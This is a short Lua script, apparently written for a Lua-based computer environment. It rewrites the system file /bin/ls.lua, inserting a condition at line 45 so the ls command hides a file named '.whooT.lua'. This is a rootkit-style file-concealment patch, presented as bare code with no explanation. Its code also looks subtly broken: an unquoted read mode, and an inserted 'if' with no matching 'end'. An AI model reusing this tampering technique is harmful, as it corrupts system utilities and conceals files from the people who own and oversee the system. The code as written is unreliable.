local f = io.open("/bin/ls.lua", r)
local junkTable = {}
local readIndex=0

repeat
readIndex=readIndex+1

if readIndex~=45 then
junkTable[readIndex]=f:read("*L")

else

junkTable[readIndex]=f:read("*l")

junkTable[readIndex]=tostring(junkTable[readIndex]) .. 'if f ~= ".whooT.lua" then \n'

end

until junkTable[readIndex] == nil

f:close()
local wF = io.open("/bin/ls.lua", 'w')
readIndex=1
while junkTable[readIndex] ~= nil do
print(junkTable[readIndex])
wF:write(junkTable[readIndex])
readIndex=readIndex+1
end
wF:close()